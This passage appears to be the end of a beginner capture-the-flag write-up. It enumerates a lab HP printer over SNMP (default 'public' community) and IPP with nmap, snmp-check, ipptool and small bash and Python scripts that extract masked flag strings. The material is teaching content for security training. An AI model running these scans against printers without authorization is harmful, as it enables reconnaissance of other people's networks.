**Sample Output**:
```
PORT     STATE SERVICE
161/udp  open  snmp
| snmp-info: 
|   enterprise: hp
|   Location: Server-Room-B | Discovery Code: FLAG{L***************1}
|   Contact: SecTeam@lab.local | FLAG{L***************4}
|_  sysDescr: HP Color LaserJet Pro MFP 4301fdw

631/tcp  open  ipp
| ipp-info: 
|   Printer URI: ipp://192.168.1.131:631/ipp/print
|   Printer Location: Server-Room-B | Discovery Code: FLAG{L***************1}
|_  Printer Info: HP-MFP-CTF-FLAG{H***************3}

9100/tcp open  jetdirect
```

**Discoveries Found**: 1, 2, and 3 (via automated scripts)

---

### Alternative 3: snmp-check Tool

```bash
# Comprehensive SNMP walk with formatted output
┌──(student@kali)-[~/printer_assessment]
└─$ snmp-check -c public 192.168.1.131 > recon/snmp-check-output.txt
```

**Searching Output**:

```bash
┌──(student@kali)-[~/printer_assessment]
└─$ cat recon/snmp-check-output.txt | head -40
```

**Output**:
```
snmp-check v1.9 - SNMP enumerator
Copyright (c) 2005-2015 by Matteo Cantoni (www.nothink.org)

[*] Try to connect to 192.168.1.131:161 using SNMPv1 and community 'public'

[*] System information:

  Host IP address               : 192.168.1.131
  Hostname                      : HP-MFP-4301
  Description                   : HP Color LaserJet Pro MFP 4301fdw
  Contact                       : SecTeam@lab.local | FLAG{L***************4}
  Location                      : Server-Room-B | Discovery Code: FLAG{L***************1}
  Uptime snmp                   : 36 days, 04:56:07.89
  System date                   : 2024-11-18 15:45:23
```

**Clean, formatted output showing discoveries 1 and 2.**

---

### Alternative 4: One-Liner Discovery Scripts

**Quick Discovery Script**:

```bash
# All-in-one discovery command
┌──(student@kali)-[~/printer_assessment]
└─$ cat > scripts/quick_discovery.sh << 'EOF'
#!/bin/bash
TARGET="192.168.1.131"
echo "=== Quick Printer Discovery ==="
echo ""
echo "SNMP Location:"
snmpget -v2c -c public $TARGET 1.3.6.1.2.1.1.6.0 2>/dev/null | cut -d: -f4
echo ""
echo "SNMP Contact:"
snmpget -v2c -c public $TARGET 1.3.6.1.2.1.1.4.0 2>/dev/null | cut -d: -f4
echo ""
echo "IPP Printer Info:"
ipptool -tv ipp://$TARGET:631/ipp/print /dev/stdin 2>/dev/null << 'IPP'
{
    NAME "Get Info"
    OPERATION Get-Printer-Attributes
    GROUP operation-attributes-tag
    ATTR charset attributes-charset utf-8
    ATTR uri printer-uri $uri
    ATTR keyword requested-attributes printer-info
    STATUS successful-ok
}
IPP
echo ""
EOF

chmod +x scripts/quick_discovery.sh
./scripts/quick_discovery.sh
```

**Output**:
```
=== Quick Printer Discovery ===

SNMP Location:
 STRING: Server-Room-B | Discovery Code: FLAG{L***************1}

SNMP Contact:
 STRING: SecTeam@lab.local | FLAG{L***************4}

IPP Printer Info:
Get Info:
    PASS
    printer-info (nameWithoutLanguage) = HP-MFP-CTF-FLAG{H***************3}
```

**Three discoveries in seconds!**

---

### Alternative 5: Python Automation

**Python Script for Comprehensive Enumeration**:

```python
#!/usr/bin/env python3
import subprocess
import re

def snmp_get(target, oid):
    """Query SNMP OID"""
    cmd = f"snmpget -v2c -c public {target} {oid}"
    result = subprocess.run(cmd.split(), capture_output=True, text=True)
    return result.stdout

def extract_discoveries(text):
    """Extract anything in FLAG{} format"""
    pattern = r'FLAG\{[A-Z]+[0-9]+\}'
    return re.findall(pattern, text)

target = "192.168.1.131"

print("[*] Printer Discovery Tool")
print(f"[*] Target: {target}\n")

# SNMP queries
print("[+] SNMP Enumeration:")
sys_location = snmp_get(target, "1.3.6.1.2.1.1.6.0")
sys_contact = snmp_get(target, "1.3.6.1.2.1.1.4.0")

print(f"  Location: {sys_location.strip()}")
print(f"  Contact: {sys_contact.strip()}")

# Extract discoveries
all_text = sys_location + sys_contact
discoveries = extract_discoveries(all_text)

print(f"\n[+] Discoveries Found: {len(discoveries)}")
for i, disc in enumerate(discoveries, 1):
    print(f"  {i}. {disc}")
```

**Save and Run**:

```bash
┌──(student@kali)-[~/printer_assessment]
└─$ python3 scripts/auto_discovery.py
```

**Output**:
```
[*] Printer Discovery Tool
[*] Target: 192.168.1.131

[+] SNMP Enumeration:
  Location: SNMPv2-MIB::sysLocation.0 = STRING: Server-Room-B | Discovery Code: FLAG{L***************1}
  Contact: SNMPv2-MIB::sysContact.0 = STRING: SecTeam@lab.local | FLAG{L***************4}

[+] Discoveries Found: 2
  1. FLAG{L***************1}
  2. FLAG{L***************4}
```

---

**Congratulations on completing this comprehensive printer penetration testing assessment!**

All 5 discoveries have been successfully identified through systematic enumeration across multiple protocols. The methodology demonstrated here applies to real-world security assessments of network infrastructure.

**Remember**: These techniques are for authorized testing only. Always obtain written permission before assessing systems you do not own.

---

**Assessment Complete**
**Discoveries Found**: 5/5
**Time**: Estimated 2-4 hours
**Difficulty**: Beginner to Intermediate
**Skills Level**: Entry-level penetration testing
